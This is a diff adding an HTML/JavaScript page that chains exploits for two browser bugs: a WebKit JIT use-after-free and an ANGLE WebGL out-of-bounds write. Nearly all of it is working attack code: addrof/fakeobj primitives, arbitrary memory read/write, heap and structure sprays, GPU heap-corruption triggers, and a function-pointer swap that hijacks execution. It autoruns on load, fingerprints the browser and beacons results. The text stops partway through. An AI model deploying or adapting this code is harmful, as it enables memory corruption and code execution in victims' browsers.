@@ -1,0 +1,3397 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2025-43529 + CVE-2025-14174 Chained Exploit Probe</title>
+</head>
+<body>
+    <h1>CVE-2025-43529 + CVE-2025-14174 Chained Exploit</h1>
+
+    <div id="sysinfo"></div>
+
+    <div id="controls">
+        <button id="runChain" onclick="runFullChain()">Run Full Exploit Chain</button>
+        <button onclick="runStage1Only()">Stage 1 Only (UAF)</button>
+        <button onclick="runStage3Only()">Stage 3 Only (ANGLE)</button>
+        <button onclick="runStage2Only()">Stage 2 Only (GPU Harness)</button>
+        <button onclick="runStage6Only()">Stage 6 Only (Native Exec Proof)</button>
+        <button id="copyOutputBtn" onclick="copyOutput(this)">Copy Output</button>
+    </div>
+
+    <div id="progressText">Ready</div>
+    <div id="output"></div>
+    <div id="results"></div>
+
+    <canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>
+
+<script>
+// =============================================================================
+// CVE-2025-43529 + CVE-2025-14174 Chained Exploit Probe
+// =============================================================================
+//
+// CREDITS:
+// CVE-2025-43529 UAF trigger, butterfly reclaim, and addrof/fakeobj primitives
+// based on work by jir4vv1t: https://github.com/jir4vv1t/CVE-2025-43529
+//
+// =============================================================================
+//
+// THIS IS A RESEARCH PoC, NOT A SANDBOX ESCAPE.
+//
+// ACHIEVED:
+// - addrof/fakeobj in renderer (CVE-2025-43529 path)
+// - live in-process read64/write64 validation via inline-slot target
+// - native behavior redirection proof by swapping JSFunction executable field
+//
+// NOT IMPLEMENTED:
+// - renderer->GPU or renderer->kernel privilege transition
+// - full sandbox escape / persistence chain
+//
+// ATTACK CHAIN (theoretical):
+// 1. WebKit UAF (CVE-2025-43529) - Get addrof/fakeobj primitives
+//    - Phi node escape bug in DFG Store Barrier Insertion
+//    - Missing write barrier causes GC to miss references
+//    - UAF on freed object, spray to reclaim, type confusion
+//
+// 2. ANGLE OOB (CVE-2025-14174) - Memory corruption
+//    - D32F texture + PBO with UNPACK_IMAGE_HEIGHT < actual height
+//    - Undersized staging buffer allocation
+//    - OOB write into GPU process memory
+//
+// =============================================================================
+
+const sysinfoDiv = document.getElementById('sysinfo');
+const outputDiv = document.getElementById('output');
+const resultsDiv = document.getElementById('results');
+const progressText = document.getElementById('progressText');
+const URL_FLAGS = new URLSearchParams(window.location.search);
+const RUN_MODE = (URL_FLAGS.get('mode') || 'chain').toLowerCase();
+const AUTO_RUN_ON_LOAD = (URL_FLAGS.get('autorun') || '1') !== '0';
+const AUTO_COPY_AFTER_CHAIN = (URL_FLAGS.get('autocopy') || '1') !== '0';
+const ENABLE_BSP_EXPERIMENT = URL_FLAGS.get('bsp') === '1';
+const BSP_FAST_MODE = (URL_FLAGS.get('bspfast') || '1') !== '0';
+const BSP_VERBOSE = URL_FLAGS.get('bspv') === '1';
+const HOT_STAGE6_IN_CRITICAL = (URL_FLAGS.get('hotstage6') || '1') !== '0';
+const HOT_NATIVE_SWAP = (URL_FLAGS.get('hotswap') || '1') !== '0';
+let autoRunStarted = false;
+
+// Global exploit state
+let exploitState = {
+    stage1Complete: false,
+    stage2Complete: false,
+    stage3Complete: false,
+    stage4Complete: false,
+    stage5Complete: false,
+    stage6Complete: false,
+
+    // Stage 1 results (UAF)
+    boxedArray: null,
+    unboxedArray: null,
+    addrof: null,
+    fakeobj: null,
+
+    // Stage 2 results (fake objects)
+    fakeArrayBuffer: null,
+    fakeArrayBufferAddr: 0n,
+    backingStoreAddr: 0n,
+
+    // Stage 3 results (ANGLE)
+    angleTriggered: false,
+    oobWriteSize: 0,
+    gpuContextLost: false,
+    gpuHarness: null,
+    gpuTriggerAttempts: 0,
+    gpuHeapCorruptions: 0,
+    lastGpuHeapHit: null,
+
+    // Stage 4 results (full primitives)
+    read64: null,
+    write64: null,
+    leakedSensitive: '',
+    nativeExecDetails: '',
+};
+
+// Evidence tracking for claims
+const evidence = {
+    addrofWorks: false,
+    fakeobjWorks: false,
+    inlineStorageWorks: false,
+    angleTriggered: false,
+    angleCorruptionDetected: false,
+    gpuCanaryCorruption: false,
+    gpuHeapCorruption: false,
+    gpuContextLost: false,
+    arbRWWorks: false,
+    chainReady: false,
+    sensitiveDataRead: false,
+    fullChainSuccess: false,
+    nativeExecWorks: false,
+};
+
+// Conversion utilities
+const conversionBuffer = new ArrayBuffer(8);
+const u64View = new BigUint64Array(conversionBuffer);
+const f64View = new Float64Array(conversionBuffer);
+
+function itof(value) {
+    u64View[0] = value;
+    return f64View[0];
+}
+
+function ftoi(f) {
+    f64View[0] = f;
+    return u64View[0];
+}
+
+function bytesToU64LE(bytes, start = 0) {
+    let out = 0n;
+    for (let i = 0; i < 8; i++) {
+        const b = (start + i) < bytes.length ? bytes[start + i] : 0;
+        out |= BigInt(b & 0xff) << BigInt(8 * i);
+    }
+    return out;
+}
+
+function u64ToBytesLE(v) {
+    const out = new Uint8Array(8);
+    for (let i = 0; i < 8; i++) {
+        out[i] = Number((v >> BigInt(8 * i)) & 0xffn);
+    }
+    return out;
+}
+
+function isLikelyNativePtr(v) {
+    if (typeof v !== 'bigint') return false;
+    if (v === 0n) return false;
+    const top16 = Number((v >> 48n) & 0xffffn);
+    if (top16 === 0x7ff8 || top16 === 0xffff) return false;
+    const raw = v & 0x00ffffffffffffffn; // tolerate PAC/TBI bits in top byte
+    if (raw < 0x10000000n) return false;
+    return true;
+}
+
+function attemptHotNativeSwap(leakA, leakB, fnA, fnB) {
+    if (typeof exploitState.read64 !== 'function' || typeof exploitState.write64 !== 'function') {
+        return { ok: false, reason: 'no_rw' };
+    }
+    const EXEC_FIELD_OFF = 0x18n; // JSFunction_executableOrRareData
+    const testArg = 123456 | 0;
+    const witnessArg = 0x515151 | 0;
+    let beforeA = 0;
+    let beforeB = 0;
+    try {
+        beforeA = fnA(testArg) | 0;
+        beforeB = fnB(testArg) | 0;
+    } catch (e) {
+        return { ok: false, reason: 'pre_call_fault' };
+    }
+    if (beforeA === beforeB) {
+        return { ok: false, reason: 'no_behavior_delta', beforeA, beforeB };
+    }
+    try {
+        const fieldA = leakA + EXEC_FIELD_OFF;
+        const fieldB = leakB + EXEC_FIELD_OFF;
+        const execA = exploitState.read64(fieldA);
+        const execB = exploitState.read64(fieldB);
+        if (execA === 0n || execB === 0n || execA === execB || execA === 0x7ff8000000000000n || execB === 0x7ff8000000000000n) {
+            return { ok: false, reason: 'bad_exec_words', beforeA, beforeB, fieldA, fieldB, execA, execB };
+        }
+        exploitState.write64(fieldA, execB);
+        const swapped = fnA(testArg) | 0;
+        const w0 = (window.__stage6_native_witness || 0) | 0;
+        fnA(witnessArg);
+        const w1 = (window.__stage6_native_witness || 0) | 0;
+        exploitState.write64(fieldA, execA);
+        const restored = fnA(testArg) | 0;
+        const w2 = (window.__stage6_native_witness || 0) | 0;
+        fnA(witnessArg);
+        const w3 = (window.__stage6_native_witness || 0) | 0;
+        const witnessSwap = (w1 === (w0 + 1)) && (w3 === w2);
+        if (swapped === beforeB && restored === beforeA && witnessSwap) {
+            return { ok: true, beforeA, beforeB, swapped, restored, fieldA, fieldB, execA, execB, w0, w1, w2, w3 };
+        }
+        return { ok: false, reason: 'swap_mismatch', beforeA, beforeB, swapped, restored, fieldA, fieldB, execA, execB, w0, w1, w2, w3 };
+    } catch (e) {
+        return { ok: false, reason: `exception_${(e && e.message) ? e.message : 'unknown'}` };
+    }
+}
+
+function attemptHotNativeSwapBySlotCopy(leakA, leakB, fnA, fnB) {
+    if (typeof exploitState.fakeobj !== 'function') {
+        return { ok: false, reason: 'no_fakeobj' };
+    }
+    const EXEC_FIELD_OFF = 0x18n; // JSFunction_executableOrRareData
+    const INLINE_OFF = 0x10n;     // JSObject inline slot base
+    const testArg = 123456 | 0;
+    const witnessArg = 0x515151 | 0;
+    let beforeA = 0;
+    let beforeB = 0;
+    try {
+        beforeA = fnA(testArg) | 0;
+        beforeB = fnB(testArg) | 0;
+    } catch (e) {
+        return { ok: false, reason: 'pre_call_fault' };
+    }
+    if (beforeA === beforeB) {
+        return { ok: false, reason: 'no_behavior_delta', beforeA, beforeB };
+    }
+    const fieldA = leakA + EXEC_FIELD_OFF;
+    const fieldB = leakB + EXEC_FIELD_OFF;
+    const baseA = fieldA - INLINE_OFF;
+    const baseB = fieldB - INLINE_OFF;
+    let dst = null;
+    let src = null;
+    let orig = undefined;
+    let donor = undefined;
+    try {
+        dst = exploitState.fakeobj(baseA);
+        src = exploitState.fakeobj(baseB);
+        orig = dst.slot0;
+        donor = src.slot0;
+        dst.slot0 = donor;
+        const swapped = fnA(testArg) | 0;
+        const w0 = (window.__stage6_native_witness || 0) | 0;
+        fnA(witnessArg);
+        const w1 = (window.__stage6_native_witness || 0) | 0;
+        dst.slot0 = orig;
+        const restored = fnA(testArg) | 0;
+        const w2 = (window.__stage6_native_witness || 0) | 0;
+        fnA(witnessArg);
+        const w3 = (window.__stage6_native_witness || 0) | 0;
+        const witnessSwap = (w1 === (w0 + 1)) && (w3 === w2);
+        if (swapped === beforeB && restored === beforeA && witnessSwap) {
+            return { ok: true, beforeA, beforeB, swapped, restored, fieldA, fieldB, donorType: typeof donor, w0, w1, w2, w3 };
+        }
+        return {
+            ok: false,
+            reason: 'swap_mismatch',
+            beforeA, beforeB, swapped, restored,
+            fieldA, fieldB,
+            donorType: typeof donor,
+            w0, w1, w2, w3
+        };
+    } catch (e) {
+        try {
+            if (dst !== null && orig !== undefined) dst.slot0 = orig;
+        } catch (_) {}
+        return { ok: false, reason: `exception_${(e && e.message) ? e.message : 'unknown'}` };
+    }
+}
+
+function log(msg, type = 'info', target = outputDiv) {
+    const div = document.createElement('div');
+    div.className = `result ${type}`;
+    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+    div.textContent = `[${timestamp}] ${msg}`;
+    // Safety check - ensure target is a valid DOM element
+    if (target && typeof target.appendChild === 'function') {
+        target.appendChild(div);
+        target.scrollTop = target.scrollHeight;
+    } else {
+        // Fallback to outputDiv if target is invalid
+        if (outputDiv && typeof outputDiv.appendChild === 'function') {
+            outputDiv.appendChild(div);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+    }
+    console.log(`[${type.toUpperCase()}] ${msg}`);
+}
+
+function beaconEvent(eventName, details = '') {
+    try {
+        const q = `event=${encodeURIComponent(eventName)}&details=${encodeURIComponent(details)}&t=${Date.now()}`;
+        const img = new Image();
+        img.src = `/__beacon?${q}`;
+    } catch (e) {
+        // ignore
+    }
+}
+
+function showManualCopyPanel(text) {
+    let panel = document.getElementById('manualCopyPanel');
+    if (!panel) {
+        panel = document.createElement('div');
+        panel.id = 'manualCopyPanel';
+        panel.style.cssText = [
+            'position:fixed',
+            'left:0',
+            'right:0',
+            'bottom:0',
+            'z-index:99999',
+            'background:#111',
+            'color:#fff',
+            'padding:10px',
+            'border-top:2px solid #0f0',
+            'font:12px monospace'
+        ].join(';');
+        panel.innerHTML = `
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+                <strong>Clipboard blocked - manual copy</strong>
+                <button id="manualCopyClose" style="padding:2px 8px;">Close</button>
+            </div>
+            <textarea id="manualCopyText" style="width:100%;height:180px;font:11px monospace;"></textarea>
+            <div style="margin-top:6px;">Tap/hold text and use system Copy.</div>
+        `;
+        document.body.appendChild(panel);
+        const closeBtn = document.getElementById('manualCopyClose');
+        if (closeBtn) {
+            closeBtn.onclick = () => {
+                panel.style.display = 'none';
+            };
+        }
+    }
+    const ta = document.getElementById('manualCopyText');
+    panel.style.display = 'block';
+    if (ta) {
+        ta.value = text;
+        ta.focus();
+        ta.select();
+        ta.setSelectionRange(0, ta.value.length);
+    }
+}
+
+async function copyOutput(buttonEl) {
+    const parts = [
+        `=== SYSINFO ===\n${sysinfoDiv.innerText || ''}`.trim(),
+        `=== OUTPUT ===\n${outputDiv.innerText || ''}`.trim(),
+        `=== RESULTS ===\n${resultsDiv.innerText || ''}`.trim(),
+    ].filter(p => p.length > 0);
+    const text = parts.join('\n\n');
+
+    let copied = false;
+    if (navigator.clipboard && window.isSecureContext) {
+        try {
+            await navigator.clipboard.writeText(text);
+            copied = true;
+        } catch (e) {
+            // Fallback below
+        }
+    }
+
+    if (!copied) {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.cssText = 'position:fixed;left:-9999px;top:0;';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        ta.setSelectionRange(0, ta.value.length);
+        copied = document.execCommand('copy');
+        document.body.removeChild(ta);
+    }
+
+    if (!copied) {
+        showManualCopyPanel(text);
+    }
+
+    const btn = buttonEl || document.getElementById('copyOutputBtn');
+    if (btn) {
+        const orig = btn.textContent;
+        btn.textContent = copied ? 'Copied!' : 'Copy Failed';
+        btn.style.background = copied ? '#0f0' : '#f66';
+        btn.style.color = '#000';
+        setTimeout(() => {
+            btn.textContent = orig;
+            btn.style.background = '';
+            btn.style.color = '';
+        }, 1200);
+    }
+
+    log(
+        copied ? 'Output copied to clipboard' : 'Clipboard write blocked; opened manual copy panel',
+        copied ? 'success' : 'warn'
+    );
+    beaconEvent('copy_output', `ok=${copied ? 1 : 0};len=${text.length}`);
+    return copied;
+}
+
+function updateProgress(current, total, phase) {
+    const pct = Math.round((current / total) * 100);
+    progressText.textContent = `${phase}: ${current}/${total} (${pct}%)`;
+}
+
+function updatePrimitiveStatus(primitive, status, working = false) {
+    const elem = document.getElementById(primitive + 'Status');
+    if (elem) {
+        elem.textContent = status;
+        elem.style.color = working ? '#00ff00' : '#ff0000';
+    }
+}
+
+function logEvidenceSummary(target = outputDiv) {
+    log('=== EVIDENCE SUMMARY ===', 'critical', target);
+    log(`addrof: ${evidence.addrofWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.addrofWorks ? 'success' : 'warn', target);
+    log(`fakeobj: ${evidence.fakeobjWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.fakeobjWorks ? 'success' : 'warn', target);
+    log(`inline storage access: ${evidence.inlineStorageWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.inlineStorageWorks ? 'success' : 'warn', target);
+    log(`ANGLE trigger: ${evidence.angleTriggered ? 'OBSERVED' : 'NOT OBSERVED'}`, evidence.angleTriggered ? 'success' : 'warn', target);
+    log(`ANGLE GPU canary corruption: ${evidence.gpuCanaryCorruption ? 'DETECTED' : 'NOT DETECTED'}`, evidence.gpuCanaryCorruption ? 'success' : 'warn', target);
+    log(`ANGLE heap-oracle corruption: ${evidence.gpuHeapCorruption ? 'DETECTED' : 'NOT DETECTED'}`, evidence.gpuHeapCorruption ? 'success' : 'warn', target);
+    log(`ANGLE context loss/reset: ${evidence.gpuContextLost ? 'DETECTED' : 'NOT DETECTED'}`, evidence.gpuContextLost ? 'success' : 'warn', target);
+    log(`ANGLE corruption evidence: ${evidence.angleCorruptionDetected ? 'DETECTED' : 'NOT DETECTED'}`, evidence.angleCorruptionDetected ? 'success' : 'warn', target);
+    log(`arb r/w: ${evidence.arbRWWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.arbRWWorks ? 'success' : 'warn', target);
+    log(`cross-process chain: ${evidence.chainReady ? 'READY' : 'NOT READY'}`, evidence.chainReady ? 'success' : 'warn', target);
+    log(`sensitive data read: ${evidence.sensitiveDataRead ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.sensitiveDataRead ? 'success' : 'warn', target);
+    log(`native execution proof: ${evidence.nativeExecWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.nativeExecWorks ? 'critical' : 'warn', target);
+    log(`full exploit chain: ${evidence.fullChainSuccess ? 'SUCCESS' : 'INCOMPLETE'}`, evidence.fullChainSuccess ? 'critical' : 'warn', target);
+}
+
+// =============================================================================
+// SYSTEM DETECTION
+// =============================================================================
+
+function detectSystem() {
+    log('=== SYSTEM DETECTION ===', 'info', sysinfoDiv);
+
+    const ua = navigator.userAgent;
+    log(`User Agent: ${ua}`, 'info', sysinfoDiv);
+
+    const isWebKit = /AppleWebKit/.test(ua);
+    const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
+    const isIOS = /iPhone|iPad|iPod/.test(ua);
+    const isChrome = /Chrome/.test(ua);
+
+    if (isWebKit) log('WebKit detected', 'success', sysinfoDiv);
+    if (isSafari) log('Safari browser detected', 'success', sysinfoDiv);
+    if (isIOS) log('iOS platform detected - BOTH CVEs applicable', 'critical', sysinfoDiv);
+    if (isChrome) log('Chrome detected - ANGLE CVE applicable', 'success', sysinfoDiv);
+
+    // Check WebGL2
+    const canvas = document.getElementById('glCanvas');
+    const gl = canvas.getContext('webgl2');
+    if (gl) {
+        log('WebGL2 available for ANGLE probe', 'success', sysinfoDiv);
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            log(`GPU Renderer: ${renderer}`, 'info', sysinfoDiv);
+            if (renderer.includes('ANGLE') || renderer.includes('Metal') || renderer.includes('Apple')) {
+                log('ANGLE/Metal backend detected - CVE-2025-14174 may apply', 'critical', sysinfoDiv);
+            }
+        }
+    } else {
+        log('WebGL2 not available - ANGLE probe limited', 'warn', sysinfoDiv);
+    }
+
+    return { isWebKit, isSafari, isIOS, isChrome };
+}
+
+// =============================================================================
+// GPU CANARY HARNESS (GPU-PROCESS ORACLES)
+// =============================================================================
+
+function fnv1a32(bytes) {
+    let hash = 0x811c9dc5;
+    for (let i = 0; i < bytes.length; i++) {
+        hash ^= bytes[i];
+        hash = Math.imul(hash, 0x01000193) >>> 0;
+    }
+    return hash >>> 0;
+}
+
+function makePatternU8(length, seed) {
+    const out = new Uint8Array(length);
+    let x = seed >>> 0;
+    for (let i = 0; i < out.length; i++) {
+        x = (Math.imul(x, 1664525) + 1013904223) >>> 0;
+        out[i] = x & 0xff;
+    }
+    return out;
+}
+
+function makePatternF32(length, seed) {
+    const out = new Float32Array(length);
+    let x = seed >>> 0;
+    for (let i = 0; i < out.length; i++) {
+        x = (Math.imul(x, 1103515245) + 12345) >>> 0;
+        out[i] = ((x >>> 8) & 0xffff) / 65535.0;
+    }
+    return out;
+}
+
+function ensureGL2Context() {
+    const getCtx = (canvas) => (
+        canvas.getContext('webgl2', { antialias: false, preserveDrawingBuffer: true, powerPreference: 'high-performance' })
+        || canvas.getContext('experimental-webgl2')
+    );
+
+    let canvas = document.getElementById('glCanvas');
+    if (!canvas) {
+        return null;
+    }
+    let gl = getCtx(canvas);
+    if (gl && !gl.isContextLost()) {
+        return gl;
+    }
+
+    // Recover from stale/lost context by replacing the canvas node.
+    const replacement = document.createElement('canvas');
+    replacement.id = 'glCanvas';
+    replacement.width = canvas.width || 1024;
+    replacement.height = canvas.height || 1024;
+    replacement.style.cssText = canvas.style.cssText;
+    canvas.replaceWith(replacement);
+    canvas = replacement;
+    gl = getCtx(canvas);
+    return gl;
+}
+
+function readTextureHash(gl, fb, texture, width, height, scratch) {
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
+    const status = gl.checkFramebufferStatus(gl.FRAMEBUFFER);
+    if (status !== gl.FRAMEBUFFER_COMPLETE) {
+        return { ok: false, hash: 0, status };
+    }
+    gl.readPixels(0, 0, width, height, gl.RGBA, gl.UNSIGNED_BYTE, scratch);
+    return { ok: true, hash: fnv1a32(scratch), status };
+}
+
+function readPBOHash(gl, pbo, byteLength, scratch) {
+    if (!scratch || scratch.byteLength < byteLength) {
+        scratch = new Uint8Array(byteLength);
+    }
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+    gl.getBufferSubData(gl.PIXEL_UNPACK_BUFFER, 0, scratch, 0, byteLength);
+    return fnv1a32(scratch.subarray(0, byteLength));
+}
+
+function snapshotGPUCanaries(gl, harness) {
+    const textureHashes = [];
+    const pboHashes = [];
+
+    if (!harness.disableTextureCanaries) {
+        for (const texInfo of harness.textureCanaries) {
+            const result = readTextureHash(gl, harness.fb, texInfo.texture, texInfo.width, texInfo.height, harness.textureScratch);
+            if (!result.ok) {
+                return { ok: false, error: `FBO incomplete: 0x${result.status.toString(16)}` };
+            }
+            textureHashes.push(result.hash);
+        }
+    }
+
+    for (const pboInfo of harness.pboCanaries) {
+        const hash = readPBOHash(gl, pboInfo.pbo, pboInfo.size, harness.pboScratch);
+        pboHashes.push(hash);
+    }
+
+    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+
+    return { ok: true, textureHashes, pboHashes };
+}
+
+function diffGPUCanaries(baseline, current) {
+    const textureMismatches = [];
+    const pboMismatches = [];
+
+    for (let i = 0; i < baseline.textureHashes.length; i++) {
+        if (baseline.textureHashes[i] !== current.textureHashes[i]) {
+            textureMismatches.push(i);
+        }
+    }
+    for (let i = 0; i < baseline.pboHashes.length; i++) {
+        if (baseline.pboHashes[i] !== current.pboHashes[i]) {
+            pboMismatches.push(i);
+        }
+    }
+
+    return {
+        textureMismatches,
+        pboMismatches,
+        changed: textureMismatches.length > 0 || pboMismatches.length > 0,
+    };
+}
+
+function setupGPUCanaryHarness(gl) {
+    const harness = {
+        fb: gl.createFramebuffer(),
+        textureCanaries: [],
+        pboCanaries: [],
+        textureScratch: new Uint8Array(96 * 96 * 4),
+        pboScratch: new Uint8Array(0x4000),
+        baseline: null,
+        attackTexture: null,
+        disableTextureCanaries: false,
+    };
+
+    // Texture canaries (GPU texture memory oracle)
+    for (let i = 0; i < 8; i++) {
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+        const width = 96;
+        const height = 96;
+        const data = makePatternU8(width * height * 4, 0xA000 + i);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+        harness.textureCanaries.push({ texture: tex, width, height });
+    }
+    gl.bindTexture(gl.TEXTURE_2D, null);
+
+    // PBO canaries (GPU buffer memory oracle)
+    for (let i = 0; i < 16; i++) {
+        const pbo = gl.createBuffer();
+        const data = makePatternU8(0x4000, 0xB000 + i);
+        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, data, gl.DYNAMIC_DRAW);
+        harness.pboCanaries.push({ pbo, size: data.byteLength });
+    }
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+
+    let snapshot = snapshotGPUCanaries(gl, harness);
+    if (!snapshot.ok) {
+        // Some Safari/Metal paths reject texture readback FBO setup. Keep PBO oracles enabled.
+        harness.disableTextureCanaries = true;
+        snapshot = snapshotGPUCanaries(gl, harness);
+    }
+    if (!snapshot.ok) {
+        throw new Error(`Failed to capture baseline canaries: ${snapshot.error}`);
+    }
+    harness.baseline = snapshot;
+
+    return harness;
+}
+
+function createHeapPBOOracle(gl, allocSize, seed, guardCount = 24) {
+    const oracle = {
+        allocSize,
+        guards: [],
+        scratch: new Uint8Array(allocSize),
+    };
+
+    for (let i = 0; i < guardCount; i++) {
+        const pbo = gl.createBuffer();
+        const data = makePatternU8(allocSize, seed + i * 0x101);
+        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, data, gl.DYNAMIC_DRAW);
+        oracle.guards.push({
+            pbo,
+            expectedHash: fnv1a32(data),
+            freed: false,
+            index: i,
+        });
+    }
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+    return oracle;
+}
+
+function punchHeapPBOHoles(gl, oracle, mode = 0) {
+    const freed = [];
+    for (let i = 0; i < oracle.guards.length; i++) {
+        let freeThis = false;
+        if (mode === 0) {
+            freeThis = (i % 3) === 1;
+        } else if (mode === 1) {
+            freeThis = (i % 2) === 1;
+        } else {
+            freeThis = (i % 4) >= 2;
+        }
+        if (!freeThis) {
+            continue;
+        }
+        const guard = oracle.guards[i];
+        if (!guard.freed && guard.pbo) {
+            gl.deleteBuffer(guard.pbo);
+            guard.freed = true;
+            freed.push(i);
+        }
+    }
+    return freed;
+}
+
+function scanHeapPBOOracle(gl, oracle) {
+    const mismatches = [];
+    for (const guard of oracle.guards) {
+        if (guard.freed || !guard.pbo) {
+            continue;
+        }
+        let hash = 0;
+        try {
+            hash = readPBOHash(gl, guard.pbo, oracle.allocSize, oracle.scratch);
+        } catch (e) {
+            mismatches.push({
+                index: guard.index,
+                reason: `read-failed:${e.message}`,
+                expectedHash: guard.expectedHash,
+                actualHash: 0,
+            });
+            continue;
+        }
+        if (hash !== guard.expectedHash) {
+            mismatches.push({
+                index: guard.index,
+                reason: 'hash-mismatch',
+                expectedHash: guard.expectedHash,
+                actualHash: hash,
+            });
+        }
+    }
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+    return {
+        changed: mismatches.length > 0,
+        mismatches,
+    };
+}
+
+function destroyHeapPBOOracle(gl, oracle) {
+    if (!oracle) return;
+    for (const guard of oracle.guards) {
+        if (guard.pbo) {
+            gl.deleteBuffer(guard.pbo);
+            guard.pbo = null;
+            guard.freed = true;
+        }
+    }
+    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+}
+
+function triggerANGLEWithHeapOracle(gl, cfg, seed) {
+    const rowPitch = cfg.width * 4;
+    const allocSize = rowPitch * cfg.unpackImageHeight;
+    const guardCount = cfg.guardCount || 24;
+    const holeMode = cfg.holeMode || 0;
+    const oracle = createHeapPBOOracle(gl, allocSize, seed ^ 0x9E370001, guardCount);
+    const freed = punchHeapPBOHoles(gl, oracle, holeMode);
+    let triggerResult;
+    let scanResult = { changed: false, mismatches: [] };
+
+    try {
+        gl.finish();
+        triggerResult = triggerANGLEDepthOOB(gl, cfg, seed);
+        if (!triggerResult.contextLost) {
+            gl.finish();
+            scanResult = scanHeapPBOOracle(gl, oracle);
+        }
+    } finally {
+        destroyHeapPBOOracle(gl, oracle);
+    }
+
+    return {
+        allocSize,
+        freed,
+        triggerResult,
+        scanResult,
+    };
+}
+
+// =============================================================================
+// STAGE 1: WebKit UAF (CVE-2025-43529)
+// =============================================================================
+//
+// The bug: DFG Store Barrier Insertion Phase fails to mark Upsilon values
+// as escaped when a Phi node escapes. This causes subsequent stores to
+// those objects to lack write barriers, allowing GC to miss new references.
+//
+// KEY INSIGHT: The spray reclaims the Date's BUTTERFLY, not the Date itself!
+// - DateInstance objects are in IsoSubspace (isolated allocator)
+// - But `a[0] = 1.1` creates a BUTTERFLY for the Date (regular heap)
+// - When Date 'a' is freed, its butterfly becomes available
+// - Spray arrays' butterflies can reclaim that freed butterfly slot
+// - This creates type confusion: freed butterfly vs spray array butterfly
+//
+// Race window technique:
+// 1. Large array (4M elements) delays GC reaching object A
+// 2. ArrayBuffer allocations (8MB each) trigger full GC
+// 3. Long loop lets GC mark A and b while we prepare
+// 4. recursive() calls clear butterfly pointers from stack
+//
+// Pattern:
+// 1. Large array pushes object A to old space
+// 2. Create Date 'a' with butterfly via a[0]=1.1, and object 'b' in eden
+// 3. Phi: f = flag ? 1.1 : b
+// 4. A.p1 = f makes Phi escape, but b is NOT marked as escaped
+// 5. Long loop lets GC mark A and b
+// 6. b.p1 = a - NO BARRIER! GC misses 'a' (and its butterfly)
+// 7. 'a' and its butterfly get collected while still referenced -> UAF
+// 8. Spray arrays to reclaim the butterfly with our controlled data
+// =============================================================================
+
+// Global UAF state (must be at top level for JIT)
+const uafArray = new Array(0x400000).fill(1.1);  // 4M array - A goes to old space
+const uafArrayIndex = uafArray.length - 1;
+let uafReclaimed = [];
+
+// PRE-ALLOCATED objects for address leaking
+// These must exist BEFORE the race so we don't allocate during the critical window
+const preAllocatedTargets = {
+    arrayBuffer: new ArrayBuffer(0x100),
+    float64Array: new Float64Array(0x10),
+    uint32Array: new Uint32Array(0x10),
+    testObject: { marker: 0xDEADBEEF, value: 1337 },
+    testArray: [1.1, 2.2, 3.3, 4.4],
+    testFunction: function() { return 42; },
+    stage6FuncA: function(x) {
+        x |= 0;
+        if (x === 0x515151) {
+            // A path intentionally has no witness side-effect.
+            return 0x11111111 | 0;
+        }
+        if ((x & 1) === 0) return (x ^ 0x55aa) | 0;
+        return (x + 0x1234) | 0;
+    },
+    stage6FuncB: function(x) {
+        x |= 0;
+        if (x === 0x515151) {
+            // Only B mutates this witness. If A does this post-swap, we proved control hijack.
+            window.__stage6_native_witness = ((window.__stage6_native_witness || 0) + 1) | 0;
+            return 0x22222222 | 0;
+        }
+        return (((x * 3) | 0) ^ 0x123456) | 0;
+    },
+};
+
+// =============================================================================
+// STRUCTURE SPRAY FOR STABLE PRIMITIVES
+// =============================================================================
+// Creating Float64Arrays with unique properties forces JSC to allocate unique
+// Structure objects. Structure IDs are sequential, so we can predict the range.
+// =============================================================================
+const STRUCTURE_SPRAY_COUNT = 0x1000;
+const structureSpray = [];
+
+for (let i = 0; i < STRUCTURE_SPRAY_COUNT; i++) {
+    let a = new Float64Array(1);
+    a['prop_' + i] = i;
+    a.extraProp = i;
+    structureSpray.push(a);
+}
+
+// Container object for our fake TypedArray
+// The inline properties of this object will hold the fake Float64Array structure.
+// JSObject inline property storage starts at offset +0x10 from object start.
+const fakeArrayContainer = {
+    // These properties map to Float64Array fields when we fakeobj() at +0x10:
+    jscell: 1.1,      // +0x00: JSCell header
+    butterfly: 1.1,   // +0x08: butterfly (null)
